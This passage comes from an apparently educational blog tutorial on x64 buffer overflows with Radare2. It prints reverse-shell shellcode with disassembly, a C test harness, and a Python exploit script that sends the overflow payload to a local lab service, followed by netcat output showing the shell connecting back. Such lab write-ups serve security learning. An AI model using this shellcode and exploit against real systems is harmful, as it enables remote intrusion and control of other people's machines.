+            0x7fffffffdc15      cc             int3
+            0x7fffffffdc16      cc             int3
+            0x7fffffffdc17      cc             int3
+            0x7fffffffdc18      cc             int3
+            ;-- rip:
+            0x7fffffffdc19      cc             int3
+            0x7fffffffdc1a      50             push rax
+            0x7fffffffdc1b      4831d2         xor rdx, rdx
+            0x7fffffffdc1e      4831f6         xor rsi, rsi
+[0x7fffffffdc13]&gt; 
+</code></pre></div></div>
+<p>And we see how those int3 instructions go right before the shellcode now.</p>
+
+<p>We can jump into something more advanced, like a reverse shell <a href="https://packetstormsecurity.com/files/160996/Linux-x64-Reverse-Shell-Shellcode.html">I took from here</a></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:  6a 29                  push   0x29
+   2:  58                     pop    rax
+   3:  6a 02                  push   0x2
+   5:  5f                     pop    rdi
+   6:  6a 01                  push   0x1
+   8:  5e                     pop    rsi
+   9:  99                     cdq    
+   a:  0f 05                  syscall 
+   c:  50                     push   rax
+   d:  5f                     pop    rdi
+   e:  52                     push   rdx
+   f:  68 7f 01 01 01         push   0x101017f
+  14:  66 68 11 5c            pushw  0x5c11
+  18:  66 6a 02               pushw  0x2
+  1b:  6a 2a                  push   0x2a
+  1d:  58                     pop    rax
+  1e:  54                     push   rsp
+  1f:  5e                     pop    rsi
+  20:  6a 10                  push   0x10
+  22:  5a                     pop    rdx
+  23:  0f 05                  syscall 
+  25:  6a 02                  push   0x2
+  27:  5e                     pop    rsi
+  28:  6a 21                  push   0x21
+  2a:  58                     pop    rax
+  2b:  0f 05                  syscall 
+  2d:  48 ff ce               dec    rsi
+  30:  79 f6                  jns    28 &lt;loop_1&gt;
+  32:  6a 01                  push   0x1
+  34:  58                     pop    rax
+  35:  49 b9 50 61 73 73 77   movabs r9,0x203a647773736150
+  3c:  64 3a 20 
+  3f:  41 51                  push   r9
+  41:  54                     push   rsp
+  42:  5e                     pop    rsi
+  43:  6a 08                  push   0x8
+  45:  5a                     pop    rdx
+  46:  0f 05                  syscall 
+  48:  48 31 c0               xor    rax,rax
+  4b:  48 83 c6 08            add    rsi,0x8
+  4f:  0f 05                  syscall 
+  51:  48 b8 31 32 33 34 35   movabs rax,0x3837363534333231
+  58:  36 37 38 
+  5b:  56                     push   rsi
+  5c:  5f                     pop    rdi
+  5d:  48 af                  scas   rax,QWORD PTR es:[rdi]
+  5f:  75 1a                  jne    7b &lt;exit_program&gt;
+  61:  6a 3b                  push   0x3b
+  63:  58                     pop    rax
+  64:  99                     cdq    
+  65:  52                     push   rdx
+  66:  48 bb 2f 62 69 6e 2f   movabs rbx,0x68732f2f6e69622f
+  6d:  2f 73 68 
+  70:  53                     push   rbx
+  71:  54                     push   rsp
+  72:  5f                     pop    rdi
+  73:  52                     push   rdx
+  74:  54                     push   rsp
+  75:  5a                     pop    rdx
+  76:  57                     push   rdi
+  77:  54                     push   rsp
+  78:  5e                     pop    rsi
+  79:  0f 05                  syscall 
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+unsigned char code[]= \
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";
+
+void main()
+{
+  printf("ShellCode Length: %d\n", strlen(code));
+  int (*ret)() = (int(*)())code;
+  ret();
+
+</code></pre></div></div>
+<p>And that can be integrated into our initial exploit like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from struct import pack
+import socket
+import sys
+
+
+rip = 0x7fffffffdba8
+
+sc = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
+revshell = b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x0 ...
+
+payload = b"\x41"*48 + b"\x90"*8 + pack("&lt;Q", rip) + b"\x90"*162 + b"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC" + revshell +b"\x90"*800 
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect = s.connect(('127.0.0.1',8081))
+s.send(payload)
+
+s.close()
+
+</code></pre></div></div>
+<p>And then, as we see, it gets executed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x7fffffffdc13]&gt; pd 10
+            ;-- rip:
+            0x7fffffffdc13      cc             int3
+            0x7fffffffdc14      cc             int3
+            0x7fffffffdc15      cc             int3
+            0x7fffffffdc16      cc             int3
+            0x7fffffffdc17      cc             int3
+            0x7fffffffdc18      cc             int3
+            0x7fffffffdc19      cc             int3
+            0x7fffffffdc1a      6a29           push 0x29               ; ')' ; section_end..comment
+            0x7fffffffdc1c      58             pop rax
+            0x7fffffffdc1d      6a02           push 2                  ; 2
+[0x7fffffffdc13]&gt; pd 20
+            ;-- rip:
+            0x7fffffffdc13      cc             int3
+            0x7fffffffdc14      cc             int3
+            0x7fffffffdc15      cc             int3
+            0x7fffffffdc16      cc             int3
+            0x7fffffffdc17      cc             int3
+            0x7fffffffdc18      cc             int3
+            0x7fffffffdc19      cc             int3
+            0x7fffffffdc1a      6a29           push 0x29               ; ')' ; section_end..comment
+            0x7fffffffdc1c      58             pop rax
+            0x7fffffffdc1d      6a02           push 2                  ; 2
+            0x7fffffffdc1f      5f             pop rdi
+            0x7fffffffdc20      6a01           push 1                  ; 1
+            0x7fffffffdc22      5e             pop rsi
+            0x7fffffffdc23      99             cdq
+            0x7fffffffdc24      0f05           syscall
+            0x7fffffffdc26      50             push rax
+            0x7fffffffdc27      5f             pop rdi
+</code></pre></div></div>
+<p>Granting us full access to a reverse shell :)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>^V^Clab@lab-VirtualBox:~/exploit-pattern$ nc -lvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from localhost 49124 received!
+Passwd: 12345678
+ls
+ls -lah
+ps
+pwd
+Downloads
+Documents
+Desktop
+</code></pre></div></div>
+<p>And ending this tutorial…</p>
+
+<p>This has been a very basic tutorial, acting like a warm up for what is about to come. Please understand that we all do start from the very beggining at some point and this is necessary to build advanced stuff on top of it.</p>
+
+<p>I hope it becomes useful for you guys. As a challenge I dare you to chance the C code to make the SOCKET FILE DESCRIPTOR a global variable and teak your exploit to trigger the EGG function :)</p>
+
+<p>If yoou want to read more about x64 buffer overflows on Linux, check this out</p>
+
+<p><a href="https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558">Buffer Overflow x64</a>
+<a href="https://samsclass.info/127/proj/ED402.htm">More about buffer overflows on x64</a></p>
+
+    </div>
+
+    <div class="post__share">
+  <ul class="share__list list-reset">
+    <li class="share__item">
+      <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/reversing-radare2-2"
+        onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+        title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+    </li>
+
+    <li class="share__item">
+      <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Reverse%20engineering%20x64%20binaries%20with%20Radare2%20-%20Exploiting%20basic%20Buffer%20Overflows&url=http://localhost:4000/reversing-radare2-2"
+        onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+        title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+    </li>
+
+    <li class="share__item">
+      <a class="share__link share__linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/reversing-radare2-2&title=Reverse%20engineering%20x64%20binaries%20with%20Radare2%20-%20Exploiting%20basic%20Buffer%20Overflows&summary=&source=Artik%20Blue"
+      onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn" rel="nofollow"><i class="ion ion-logo-linkedin"></i></a>
+    </li>
+  </ul>
+</div>
+
+
+    <div class="post__navigation">
+  
+  <a class="post__prev" href="/asyncio-python">
+    <div class="prev__image">
+      <img class="lazy" data-src="/images//asyncio/head.jpeg" alt="Reverse engineering x64 binaries with Radare2 - Exploiting basic Buffer Overflows">
+    </div>
+    <div class="prev__box">
+      <span class="post__nav post__nav__prev">Older post</span>
+      <h2 class="post__nav__title">Async programming made easy with python asyncio</h2>
+    </div>
+  </a>
+  
+
+  
+  <a class="post__next" href="/arduino-embedded-5">
+    <div class="next__box">
+      <span class="post__nav post__nav__next">Newer post</span>
+      <h2 class="post__nav__title">Embedded systems programming with atmel328 - 6</h2>
+    </div>
+    <div class="next__image">
+      <img class="lazy" data-src="/images//radare2/radare2_20.png" alt="Reverse engineering x64 binaries with Radare2 - Exploiting basic Buffer Overflows">
+    </div>
+  </a>
+  
+</div>
+
+     <!-- begin comments -->
+<div id="disqus_thread" class="post__comments">
+  <div id="disqus_empty"></div>
+</div>
+
+<script>
+  function load_disqus() {
+    var disqus_shortname = 'artikblue',
+      is_disqus_empty = document.getElementById('disqus_empty'),
+      disqus_target = document.getElementById('disqus_thread'),
+      disqus_embed = document.createElement('script'),
+      disqus_hook = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);
+
+    if (disqus_target && is_disqus_empty) {
+      disqus_embed.type = 'text/javascript';
+      disqus_embed.async = true;
+      disqus_embed.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      disqus_hook.appendChild(disqus_embed);
+      is_disqus_empty.remove();
+    }
+  }
+
+  window.addEventListener('scroll', function (e) {
+    var currentScroll = document.scrollingElement.scrollTop;
+    var disqus_target = document.getElementById('disqus_thread');
+
+    if (disqus_target && (currentScroll > disqus_target.getBoundingClientRect().top - 150)) {
+      load_disqus('disqus_shortname');
+    }
+  }, false);
+
+</script>
+<noscript>Please enable JavaScript to view the
+  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<!-- end comments --> 
+
+  </article>
+</div>
+<!-- end post -->
+      </div>
+      <!-- end wrapper-page -->
+    </main>
+    <!-- end content -->
+    <div class="top" title="Top"><i class="ion ion-ios-arrow-round-up"></i></div>
+    <!-- begin footer -->
+<footer class="footer">
+  <div class="container">
+    <div class="row">
+      <div class="col col-12 col-m-12">
+        <div class="footer__inner">
+
+          <div class="footer__head">
+            <div class="row">
+              <div class="col col-4 col-d-6 col-t-12">
+  <div class="widget widget-recent">
+    <div class="widget__head">
+      <h3 class="widget__title">Recent Posts</h3>
+    </div>
+    
+    <div class="recent-posts">
+      
+      <a class="recent-posts__image" href="/reversing-radare-22">
+        <img class="lazy" data-src="/images//radare2/radare2_22.png" alt="Reverse engineering x64 binaries with Radare2 - Enabling code execution on Stack">
+      </a>
+      
+      <div class="recent-posts__content">
+        <div class="recent-posts__date">
+          <time class="timeago" datetime="2022-06-20T00:01:35+02:00">Jun 20, 2022</time>
+        </div>
+        <h4 class="recent-posts__title"><a href="/reversing-radare-22">Reverse engineering x64 binaries with Radare2 - Enabling code execution on Stack</a></h4>
+      </div>
+    </div>
+    
+    <div class="recent-posts">
+      
+      <a class="recent-posts__image" href="/reversing-radare-21">
+        <img class="lazy" data-src="/images//radare2/radare2_21.png" alt="Reverse engineering x64 binaries with Radare2 - Bypasssing DEP with simple ROP Chains">
+      </a>
+      
+      <div class="recent-posts__content">
+        <div class="recent-posts__date">
+          <time class="timeago" datetime="2022-06-15T00:01:35+02:00">Jun 15, 2022</time>
+        </div>
+        <h4 class="recent-posts__title"><a href="/reversing-radare-21">Reverse engineering x64 binaries with Radare2 - Bypasssing DEP with simple ROP Chains</a></h4>
+      </div>
+    </div>
+    
+  </div>
+</div>
+              <div class="col col-4 col-d-6 col-t-12">
+  <div class="widget widget-gallery">
+    <div class="widget__head">
+      <h3 class="widget__title">Gallery</h3>
+    </div>
+    
+    <div class="gallery-box gallery-footer">
+      <div class="gallery">
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/landscape1.jpg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/sasha1.jpeg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/castle1.jpg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/scotland1.jpg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/sanfran1.jpg" alt="Minimalism">
+        </div>
+        
+        <div class="gallery__image">
+          <img class="lazy" data-src="/images/newyork1.jpg" alt="Minimalism">
+        </div>
+        
+      </div>
+    </div>
+    
+  </div>
+</div>
+              <div class="col col-4 col-d-6 col-t-12">
+  <div class="widget widget-subscribe">
+    <div class="widget__head">
+      <h3 class="widget__title"></h3>
+    </div>
+    <div class="subscribe__inner">
+      <div class="subscribe__group">
+        <div class="subscribe__description"></div>
+      </div>
+      <!-- <form class="subscribe-form validate"
+           action="#" method="POST" id="membedded-subscribe-form" name="membedded-subscribe-form" target="_blank" novalidate>
+           <label class="screen-reader-text" for="mce-EMAIL">Email address</label>
+           <input class="subscribe-email required email" id="mce-EMAIL" type="text" name="EMAIL"
+           placeholder="Your email address">
+           <button class="button subscribe-button" id="membedded-subscribe" type="submit" name="subscribe"></button>
+           </form> -->
+    </div>
+  </div>
+</div>
+
+            </div>
+          </div>
+        </div>
+
+        
+  <div class="social">
+    <ul class="social__list list-reset">
+      
+      <li class="social__item">
+        <a class="social__link" href="https://twitter.com/artikblue" target="_blank" rel="noopener" aria-label="social icon"><i class="ion ion-logo-twitter"></i></a>
+      </li>
+      
+      <li class="social__item">
+        <a class="social__link" href="https://github.com/artikblue" target="_blank" rel="noopener" aria-label="social icon"><i class="ion ion-logo-github"></i></a>
+      </li>
+      
+    </ul>
+  </div>
+
+        <div class="copyright">2022 &copy; <a href="/">Artik Blue</a>
+      </div>
+    </div>
+  </div>
+</footer>
+<!-- end footer -->
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="/js/scripts.js"></script>
+</body>
+
+</html>
